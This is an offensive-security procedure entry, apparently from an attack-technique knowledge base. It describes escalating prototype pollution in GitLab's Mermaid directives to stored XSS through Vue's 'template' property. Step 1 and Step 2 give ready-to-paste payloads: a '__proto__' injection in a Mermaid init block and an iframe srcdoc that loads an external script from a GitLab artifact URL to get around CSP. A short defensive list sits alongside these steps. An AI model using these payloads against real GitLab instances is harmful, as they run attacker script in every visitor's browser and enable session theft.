---
id: proc-uuid-placeholder-2
tags:
  - stored-xss
  - prototype-pollution
  - vuejs
  - csp-bypass
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:49.510Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Escalate-Prototype-Pollution-to-Stored-XSS

## Summary

This procedure escalates basic prototype pollution in GitLab Mermaid directives to stored XSS by overwriting the Vue.js 'template' property with a malicious iframe payload, enabling arbitrary JavaScript execution upon user interaction while bypassing CSP.

## Description

Building on prototype pollution, this targets Vue.js components in GitLab's frontend, where polluting the 'template' property injects arbitrary HTML. The payload uses an iframe with srcdoc containing an external script hosted in GitLab artifacts, evading CSP restrictions on inline scripts. When a user interacts (e.g., clicks search), Vue renders the template, executing the JS. This affects all visitors to the issue page, allowing session theft or further attacks. Requires the same access as basic pollution but uses a crafted payload.

## Requirements

1. GitLab account with issue creation access.
2. Ability to host a malicious JS payload (e.g., in a GitLab CI artifact or external site).
3. Browser for testing payload execution.

## Defense

Defensive measures and detection strategies:

- Blacklist dangerous prototype keys and validate JSON in Mermaid parsers.
- Strengthen CSP to block iframe srcdoc and external scripts from untrusted sources.
- Audit Vue.js template rendering for user-controlled inputs.
- Log and alert on unexpected iframe or script loads in client-side events.

## Objectives

1. Pollute Vue.js template to inject executable HTML/JS.
2. Achieve stored XSS for persistent execution across sessions.
3. Bypass security controls like CSP.

## Instructions

### Step 1: Prepare Escalated Payload

**Context**: Craft the payload targeting the 'template' property with an iframe for JS execution.

Use this string for the template value:

```html
<iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="<script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js></script>"></iframe>
```

> Ensure the external script URL is accessible and contains the desired JS (e.g., alert(document.cookie)).

### Step 2: Inject in New Issue

**Context**: Create a fresh issue to avoid interference from prior pollution.

Insert into the description:

```markdown
%%{init: { '__proto__': {'template': '<iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js&gt;&lt;/script&gt;"></iframe>'}} }%% sequenceDiagram Alice->>Bob: Hi Bob Bob->>Alice: Hi Alice
```

> Note the HTML encoding (&lt; for <) to survive Markdown parsing.

### Step 3: Save and Test Rendering

**Context**: Persist and verify the pollution affects Vue templates.

Submit the issue, then inspect the page source or console for the injected template.

> Interact with the page (e.g., search bar click) to trigger rendering; monitor network for script fetch.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[stored-xss]]
- [[csp-bypass]]
- [[JavaScript]]
